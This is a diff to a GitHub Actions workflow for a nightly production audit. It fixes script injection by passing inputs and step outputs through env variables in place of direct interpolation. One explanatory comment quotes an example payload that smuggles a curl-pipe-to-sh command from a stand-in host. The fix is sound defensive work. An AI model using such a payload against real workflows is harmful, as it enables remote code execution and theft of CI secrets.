@@ -42,13 +42,21 @@ jobs:
 
       - name: Run the audit
         id: audit
+        # Values reach the script through `env:`, NEVER through `${{ }}`
+        # interpolated into the shell. A workflow_dispatch input is
+        # attacker-controlled, and interpolating it directly into a `run:`
+        # block is the classic Actions script-injection: a site value of
+        # `x";curl evil.sh|sh;"` would execute. Via env the shell only ever
+        # sees a variable reference, so the value cannot become code.
+        # Caught by CodeQL, which analyses workflow files too.
+        env:
+          AUDIT_EXPECTED_COMMIT: ${{ github.sha }}
+          AUDIT_SITE: ${{ inputs.site || 'https://laxair.shop' }}
         # Never let a red audit abort the job — the report is the whole
         # point, and a failed step would skip every step after it.
         run: |
           set +e
-          AUDIT_EXPECTED_COMMIT="${{ github.sha }}" \
-          AUDIT_SITE="${{ inputs.site || 'https://laxair.shop' }}" \
-            node scripts/production-audit.mjs > report.md 2>&1
+          node scripts/production-audit.mjs > report.md 2>&1
           echo "status=$?" >> "$GITHUB_OUTPUT"
           cat report.md
 
@@ -59,6 +67,8 @@ jobs:
       - name: Open or update the tracking issue
         env:
           GH_TOKEN: ${{ github.token }}
+          # Same rule: through env, not interpolated into the script.
+          AUDIT_STATUS: ${{ steps.audit.outputs.status }}
         run: |
           set +e
           TITLE="Nightly production audit"
@@ -69,7 +79,7 @@ jobs:
           EXISTING=$(gh issue list --state open --search "$TITLE in:title" \
             --json number,title --jq ".[] | select(.title==\"$TITLE\") | .number" | head -1)
 
-          if [ "${{ steps.audit.outputs.status }}" = "0" ]; then
+          if [ "$AUDIT_STATUS" = "0" ]; then
             # Green: close a previously-open issue, say nothing otherwise.
             # A daily "all fine" comment trains people to ignore the issue.
             if [ -n "$EXISTING" ]; then
